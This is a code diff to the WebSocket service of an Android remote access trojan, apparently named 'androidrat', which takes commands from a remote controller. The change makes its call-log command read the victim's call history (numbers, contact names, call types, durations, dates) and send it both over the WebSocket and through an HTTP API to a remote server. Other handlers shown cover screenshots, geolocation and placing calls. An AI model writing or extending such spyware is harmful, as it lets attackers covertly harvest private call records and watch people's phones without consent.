@@ -20,10 +20,16 @@ import com.nqmgaming.androidrat.command.DeviceInfo
 import com.nqmgaming.androidrat.command.IpAddress
 import com.nqmgaming.androidrat.command.Screenshot
 import com.nqmgaming.androidrat.command.geoLocation
+import com.nqmgaming.androidrat.core.di.RetrofitModule
 import com.nqmgaming.androidrat.core.util.Constant.IP_ADDRESS
 import com.nqmgaming.androidrat.core.util.Constant.PORT
 import com.nqmgaming.androidrat.core.util.MediaProjectionManagerHolder.mediaProjectionData
+import com.nqmgaming.androidrat.data.PhoneDto
+import com.nqmgaming.androidrat.data.dto.DeviceDto
 import com.nqmgaming.androidrat.data.dto.MessageDto
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.WebSocket
@@ -139,6 +145,7 @@ class WebSocketService : Service() {
                 "10. battery - Get battery status\n" +
                 "11. network_info - Get network information\n"
     }
+
     @RequiresApi(Build.VERSION_CODES.M)
     private fun onGetCommand(command: String, webSocket: WebSocket) {
         if (command.contains("help")) {
@@ -219,7 +226,7 @@ class WebSocketService : Service() {
             }
 
         } else if (command.contains("read_call_logs")) {
-            var callLogs = ""
+            val callLogs = mutableListOf<PhoneDto>()
             val cursor = contentResolver.query(
                 CallLog.Calls.CONTENT_URI,
                 null,
@@ -232,19 +239,38 @@ class WebSocketService : Service() {
                 val nameIndex = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)
                 val statusIndex = cursor.getColumnIndex(CallLog.Calls.TYPE)
                 val durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION)
+                val dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE)
 
                 val number = if (numberIndex != -1) cursor.getString(numberIndex) else null
                 val name = if (nameIndex != -1) cursor.getString(nameIndex) else null
                 val status = if (statusIndex != -1) cursor.getString(statusIndex) else null
                 val duration = if (durationIndex != -1) cursor.getString(durationIndex) else null
+                val date = if (dateIndex != -1) cursor.getString(dateIndex) else null
 
-                callLogs += "Name: $name\nNumber: $number\nStatus: $status\nDuration: $duration\n\n"
+                val phoneDto = PhoneDto(
+                    number = number,
+                    name = name,
+                    status = status,
+                    duration = duration,
+                    time = date
+                )
+                callLogs.add(phoneDto)
             }
             cursor.close()
             if (callLogs.isEmpty()) {
-                callLogs = "No call logs found"
+                webSocket.send("No call logs found")
             }
-            webSocket.send(callLogs)
+            CoroutineScope(Dispatchers.IO).launch {
+                try {
+                    val response = RetrofitModule.api.postPhone(callLogs)
+                    val responseBody = response.execute().body()
+                    println("Call logs sent successfully")
+                } catch (e: Exception) {
+                    println("Error sending call logs: ${e.message}")
+                }
+            }
+            val callLogsJson = Gson().toJson(callLogs)
+            webSocket.send(callLogsJson)
         } else if (command.contains("call")) {
             // get number from command format: call:1234567890
             val number = command.split(":")[1]
